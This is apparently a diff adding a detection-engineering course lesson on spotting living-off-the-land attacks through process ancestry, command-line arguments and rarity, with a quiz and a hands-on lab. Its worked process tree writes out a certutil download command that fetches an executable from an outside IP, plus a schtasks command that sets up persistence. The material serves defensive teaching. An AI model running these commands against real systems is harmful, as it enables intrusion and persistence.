@@ -1,0 +1,171 @@
+---
+title: "Behavioural Detection and Living Off the Land"
+course: detection
+order: 5
+summary: "When the attacker uses only tools you already trust, the binary stops being evidence and the relationship between processes becomes the whole case."
+rung: 3
+minutes: 30
+attack: ["T1218", "T1059.001", "T1204.002", "T1036", "T1053.005", "T1543.003"]
+atlas: []
+objectives: []
+tags: ["behavioural-detection", "lolbin", "lolbas", "process-ancestry", "baselining", "sysmon"]
+updated: 2026-07-26
+---
+
+import Quiz from '../../../components/Quiz.astro';
+import Callout from '../../../components/Callout.astro';
+import Lab from '../../../components/Lab.astro';
+
+Module 4's tuning ladder put "sharpen the hypothesis" at the top, and this module is what that looks like when you take it seriously. It also confronts the situation that breaks artefact-based detection completely: **the adversary who introduces no malware at all.**
+
+Living off the land means operating with the tools already installed and already trusted — `powershell.exe`, `certutil.exe`, `rundll32.exe`, `wmic.exe`, `mshta.exe`. There is no hash to block, because the binary is Microsoft-signed and present on every host in the estate. There is no suspicious file to find, because no file was dropped. Everything on the bottom two rows of the Pyramid of Pain from Module 1 is worthless here. What is left is *how the tool was used and what asked it to run* — and that is the entire subject of behavioural detection.
+
+## The binary is not the signal
+
+The LOLBAS project catalogues these Living Off The Land Binaries, Scripts and Libraries, and reading a few entries reframes the problem quickly:
+
+| Binary | Legitimate purpose | Abused for |
+|---|---|---|
+| `certutil.exe` | Certificate management | Downloading files, base64 encode/decode, hiding data in alternate data streams |
+| `mshta.exe` | Run HTML applications | Executing remote HTAs and inline VBScript/JScript |
+| `rundll32.exe` | Load and run DLLs | Executing arbitrary DLLs, remote code, COM objects and JScript payloads |
+
+ATT&CK groups this as **T1218 System Binary Proxy Execution**: the adversary proxies their execution through a signed system binary precisely so that allowlisting and reputation checks wave it through. The counterpart on Unix is the GTFOBins catalogue, and the logic is identical.
+
+So if `certutil.exe` running is normal and `certutil.exe` running is also the attack, what distinguishes them? Three things, and they are the working vocabulary of this module: **ancestry**, **arguments** and **rarity**.
+
+## Ancestry: who asked for this
+
+The single highest-value behavioural signal on Windows is the **parent-child process relationship**. Individually, `winword.exe` is normal and `powershell.exe` is normal. `winword.exe` spawning `powershell.exe` is a macro executing code — **T1204.002 User Execution: Malicious File** — and it is close to never legitimate.
+
+That pattern generalises into a set of relationships worth knowing by heart:
+
+- An Office application spawning any script interpreter or shell.
+- A browser spawning a shell.
+- `services.exe` spawning something unexpected — often **T1543.003 Windows Service** persistence.
+- `svchost.exe` with a parent that is not `services.exe`, a classic masquerading tell.
+- Any interpreter spawned by a process that has no business scripting.
+
+The reason this works is structural, and it is why the signal is durable: **the attacker controls the child but rarely controls the parent.** A phishing payload has to execute *from somewhere*, and that somewhere is the document reader, the mail client, or the browser that delivered it. Changing the tool is trivial; changing what launched it means changing the delivery mechanism.
+
+## Arguments: what it was asked to do
+
+Once you have the process, the command line usually carries the intent. Encoded PowerShell (`-enc`), download cradles, `certutil -urlcache -f`, execution policy bypasses — these are the arguments that distinguish administrative use from abuse.
+
+<Callout type="warn">
+This entire class of detection depends on telemetry that is **off by default**, which is the recurring theme of the platform and the most common reason behavioural rules never fire.
+
+Windows event **4688** (process creation) requires the **Audit Process Creation** policy, whose default is *Not configured*. Worse, 4688 does **not include the command line** unless you separately enable **"Include command line in process creation events"** (Administrative Templates > System > Audit Process Creation), also *Not configured* by default. Without that second setting you get "powershell.exe ran" and nothing about what it did, which is almost useless for this module's purposes. Sysmon Event ID 1 provides process creation with parent and command line as an alternative.
+
+Two operational details worth carrying: Microsoft warns that with command-line auditing enabled, "any user with access to read the security events will be able to read the command line arguments for any successfully created process", and command lines "can contain sensitive or private information such as passwords" — so the Security log becomes a credential source and needs to be treated as one. And event **4719** is logged when advanced audit policy settings are overwritten by basic audit policy, which is how carefully-configured auditing silently reverts.
+</Callout>
+
+## Rarity: the cheapest anomaly detection there is
+
+The third signal needs no machine learning and is consistently underrated. **Stack counting** — sometimes called long-tail analysis — means aggregating a field across the estate and reading the bottom of the list.
+
+Count every parent-child pair across 10,000 endpoints. The top of the list is thousands of identical, boring pairs. The bottom is the pairs that happened once. Compromise lives in the long tail, because whatever the adversary did, they did it on a handful of machines and everyone else did not.
+
+The same trick applies to almost any field: services run once across the estate, scheduled tasks with a unique name (**T1053.005**), a signed binary executing from one unusual path (**T1036 Masquerading**), a DLL loaded by a single host. Rarity is not proof of malice — it is a ranking function that puts a human in front of the right 20 events instead of the wrong 20,000.
+
+<Callout type="key">
+The trade-off from Module 1's pyramid, now concrete. Behavioural detections are **durable** — they survive the adversary changing tools, infrastructure and payloads, because they describe something the intrusion cannot avoid doing. They are also **where all the false positives live**, because legitimate software genuinely does most of these things: administrators use PowerShell, deployment tools spawn interpreters, backup agents behave strangely by design.
+
+This is not a flaw to engineer away. It is the deal: **you trade precision for durability, and you pay for that trade with tuning.** Module 4 is what makes Module 5 deployable. A team that wants behavioural coverage without investing in tuning gets neither, because the noise forces the rules off within a month.
+</Callout>
+
+## Reading a process tree
+
+Rung 3. Here is a process ancestry chain from one workstation. Nothing in it is malware, and every binary is Microsoft-signed. Decide what happened before reading on.
+
+```text
+explorer.exe
+ |- outlook.exe
+     |- winword.exe            [Invoice_Q3.docm]
+         |- cmd.exe            /c certutil -urlcache -split -f
+                                  http://185.x.x.x/a.txt %TEMP%\a.exe
+             |- certutil.exe
+             |- schtasks.exe   /create /tn "OneDriveSync"
+                                  /tr %TEMP%\a.exe /sc minute /mo 30
+```
+
+Read it top down and the whole intrusion is legible without a single hash. `outlook.exe` to `winword.exe` is a user opening a mailed attachment — note the `.docm`, a macro-enabled document. `winword.exe` spawning `cmd.exe` is the macro executing: **T1204.002**. `certutil` with `-urlcache -f` is not certificate management, it is a downloader: **T1218**. Then `schtasks` creating a task named `OneDriveSync` that runs a binary out of `%TEMP%` every 30 minutes is persistence — **T1053.005** — with a name chosen to survive a bored glance, which is **T1036 Masquerading**.
+
+Now notice what a purely artefact-based approach would have produced here: `a.exe` is unknown to reputation services, and every other component is a signed Microsoft binary doing something it is legitimately capable of. The detection has to come from the *shape* of the tree.
+
+The practical lesson is that **the strongest detections in this chain are the earliest ones.** An alert on Office spawning a shell catches this at step three, before download and before persistence. An alert on the scheduled task catches it after the adversary already has a foothold and a return path. Both are worth having; only one gives you a chance to end the incident cheaply.
+
+<Quiz mid="detection/05-behavioural-detection" title="Behavioural Detection and Living Off the Land" questions={[
+  {
+    q: "Why does hash and reputation-based detection fail against a living-off-the-land intrusion?",
+    opts: ["Because the binaries are obfuscated", "Because the tools used are legitimate, Microsoft-signed binaries already present on every host -- there is no malicious file to identify", "Because LOLBins run only in memory", "Because signatures cannot be written for scripts"],
+    a: 1,
+    why: "The adversary introduces nothing new. certutil.exe, rundll32.exe and powershell.exe are signed, trusted and present everywhere, so hash blocking, reputation and allowlisting all pass them. ATT&CK calls this T1218 System Binary Proxy Execution, and it is chosen precisely because those controls wave it through. What remains is how the tool was used and what launched it."
+  },
+  {
+    q: "Why is the parent-child process relationship such a durable detection signal?",
+    opts: ["Parent processes cannot be spoofed by any technique", "The attacker controls the child but rarely controls the parent -- a payload must execute from the document reader, mail client or browser that delivered it", "Parent process data is collected by default on all systems", "Child processes always inherit the parent's hash"],
+    a: 1,
+    why: "Changing tooling is trivial; changing what launched the tool means changing the delivery mechanism itself. A macro payload has to run from the Office application that opened the document, which is why winword.exe spawning a shell is close to never legitimate and survives the adversary swapping payloads."
+  },
+  {
+    q: "You enable Audit Process Creation and start collecting event 4688, but your command-line detections never fire. What is the most likely cause?",
+    opts: ["4688 is only generated on domain controllers", "The separate 'Include command line in process creation events' policy is not enabled -- it is off by default, so 4688 carries no command line", "Command lines are encrypted in the Security log", "4688 was deprecated in favour of Sysmon"],
+    a: 1,
+    why: "Audit Process Creation gives you 4688, but the command line is only included when the additional policy under Administrative Templates > System > Audit Process Creation is enabled, and its default is Not configured. Without it you learn that powershell.exe ran and nothing about what it did. Sysmon Event ID 1 is the common alternative, providing parent and command line together."
+  },
+  {
+    q: "What is stack counting (long-tail analysis) and why is it useful?",
+    opts: ["Counting the memory stack of a suspicious process", "Aggregating a field across the estate and examining the rarest values, since compromise usually appears on a handful of hosts while everything else is common", "Ranking alerts by severity score", "Counting how many times a rule has fired this month"],
+    a: 1,
+    why: "Aggregate parent-child pairs, service names or scheduled tasks across the estate and the top of the list is thousands of identical boring entries while the bottom holds things that happened once. Rarity is not proof of malice -- it is a ranking function that puts an analyst in front of the right twenty events rather than the wrong twenty thousand, and it needs no machine learning."
+  },
+  {
+    q: "In the worked process tree, which detection would end the incident most cheaply?",
+    opts: ["Alerting on the scheduled task creating persistence", "Alerting on winword.exe spawning a shell, which catches the chain before download and persistence", "Alerting on the unknown hash of a.exe", "Alerting on outlook.exe launching winword.exe"],
+    a: 1,
+    why: "Office spawning a shell fires at step three, before certutil downloads anything and before schtasks establishes a return path. The scheduled task alert is still worth having, but by then the adversary has a foothold and persistence. Outlook launching Word is ordinary user behaviour, and the hash of a.exe is unknown rather than known-bad."
+  },
+  {
+    q: "Behavioural detections are described as durable but noisy. What follows from that for a detection programme?",
+    opts: ["Behavioural detection should be avoided in favour of signatures", "Durability is bought with precision, so behavioural coverage requires investment in tuning -- without it the noise forces the rules off within a month", "Behavioural rules need no tuning because they describe required behaviour", "Noise can be eliminated entirely with better queries"],
+    a: 1,
+    why: "Legitimate software genuinely does most of these things: administrators use PowerShell, deployment tools spawn interpreters, backup agents behave oddly by design. That noise is the price of rules that survive the adversary changing tools. Module 4's tuning discipline is what makes behavioural detection deployable, which is why the two modules are inseparable."
+  },
+  {
+    q: "A scheduled task named 'OneDriveSync' runs a binary from %TEMP% every 30 minutes. Which two techniques does this combination represent?",
+    opts: ["T1218 System Binary Proxy Execution and T1059.001 PowerShell", "T1053.005 Scheduled Task for persistence and T1036 Masquerading for the deceptive name", "T1204.002 User Execution and T1543.003 Windows Service", "T1036 Masquerading only"],
+    a: 1,
+    why: "Creating the task for recurring execution is T1053.005 Scheduled Task, and choosing a name that resembles legitimate software so it survives a casual review is T1036 Masquerading. Note also the location: a legitimate sync client does not run from %TEMP%, so the path is as much a signal as the name."
+  }
+]} />
+
+<Lab title="Build a process-ancestry baseline and hunt the long tail" host="Detection lab VM (Windows + Sysmon) + your log platform" minutes={70}>
+
+You are going to establish what normal looks like on your own lab, then detect a living-off-the-land chain you execute yourself — with no reliance on hashes or reputation.
+
+1. **Instrument properly.** Confirm you are collecting process creation with both parent and command line. Either enable Audit Process Creation *and* "Include command line in process creation events", or use Sysmon Event ID 1. Verify by inspecting one real event and confirming the command line is populated — do not assume it.
+2. **Baseline.** Over at least 24 hours of ordinary use, aggregate every parent-child process pair. Produce a stack-ranked table: pair, count. Record how many distinct pairs you see and how many occurred only once.
+3. **Read the long tail.** Examine the rarest 20 pairs. For each, decide whether it is benign and why. This is the skill — most will be legitimate, and articulating why is what makes the rare ones stand out later.
+4. **Execute a chain.** Safely, in your lab, reproduce a benign version of the worked example: have a document or script spawn `cmd.exe`, use a LOLBin to fetch a harmless file from a host you control, and create a scheduled task pointing at it. Do not use real malware — the point is the shape, not the payload.
+5. **Find it without hashes.** Search only on behaviour: the unusual parent-child pair, the LOLBin arguments, the new scheduled task. Confirm you can reconstruct the full chain from telemetry alone.
+6. **Write two detections.** One early (unusual parent spawning an interpreter) and one late (scheduled task creation from a temp path). Note which fired first and what each would have given a responder.
+7. **Estimate the cost.** For the early rule, count how many times it would have fired against your 24-hour baseline. That number is its false positive rate in your environment — carry it into the tuning cycle from Module 4.
+
+**Evidence of completion:** a journal entry with (a) proof your telemetry includes parent and command line, with a sample event, (b) your stack-ranked parent-child table with counts and the number of single-occurrence pairs, (c) your analysis of the rarest 20 with a benign/suspicious verdict for each, (d) the reconstructed chain found by behaviour alone, and (e) both detections with the early rule's measured false positive count from your baseline. Item (c) is the one that builds the actual skill: knowing what is normal in an environment is what makes abnormal visible, and it cannot be learned from a rule library.
+
+</Lab>
+
+## Sources
+
+- [LOLBAS Project](https://lolbas-project.github.io/) — the catalogue of Living Off The Land Binaries, Scripts and Libraries, including the documented abuse of `certutil.exe` for download and encoding, `mshta.exe` for remote HTA execution, and `rundll32.exe` for arbitrary DLL and COM execution
+- [GTFOBins](https://gtfobins.github.io/) — the Unix counterpart catalogue
+- [MITRE ATT&CK T1218 — System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/) — proxying execution through signed system binaries to bypass allowlisting and reputation controls
+- [MITRE ATT&CK T1204.002 — User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/) — the macro-execution step in the worked example
+- [MITRE ATT&CK T1053.005 — Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) — the persistence step
+- [MITRE ATT&CK T1036 — Masquerading](https://attack.mitre.org/techniques/T1036/) — the deceptively named task and unusual execution path
+- [MITRE ATT&CK T1543.003 — Create or Modify System Process: Windows Service](https://attack.mitre.org/techniques/T1543/003/) — the service-creation ancestry pattern
+- [MITRE ATT&CK T1059.001 — Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/) — the interpreter whose command-line arguments carry the intent
+- [Microsoft Learn — Command line process auditing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing) — that Audit Process Creation defaults to Not configured, that "Include command line in process creation events" is separately required and also not enabled by default, the warning that command lines are readable by anyone with Security log access and "can contain sensitive or private information such as passwords", and that event 4719 is logged when advanced audit settings are overwritten
+- [Microsoft Learn — 4688(S) A new process has been created](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4688) — the process creation event and its fields
+- [Microsoft Learn — Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) — Event ID 1 process creation with full command line and parent process details
